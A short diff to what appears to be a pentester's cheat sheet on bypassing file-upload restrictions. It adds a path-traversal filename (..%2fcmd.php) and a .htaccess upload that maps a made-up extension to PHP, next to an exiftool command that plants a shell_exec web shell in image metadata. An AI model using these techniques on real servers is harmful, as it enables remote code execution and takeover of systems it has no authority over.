@@ -13,7 +13,7 @@
 ```bash
 
 - Content-Type: image/jpeg
-- Doesn't interpret PHP? -> path traversal in name ..%2f
+- Doesn't interpret PHP? -> path traversal to directory that interpreter php. e.g -> filename=..%2fcmd.php
 - not php allowed? 
 	  -> upload .htaccess
 	  -> inject php in metadata with exiftool
@@ -50,6 +50,8 @@ exiftool foto.jpg -Comment='<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</p
 ```php
 // Example of a .htaccess file used to override default MIME-type behaviour
 filename=".htaccess"
+Content-Type: text/plain
+
 AddType application/x-httpd-php .FOO
 filename="cmd.FOO" 
 ```
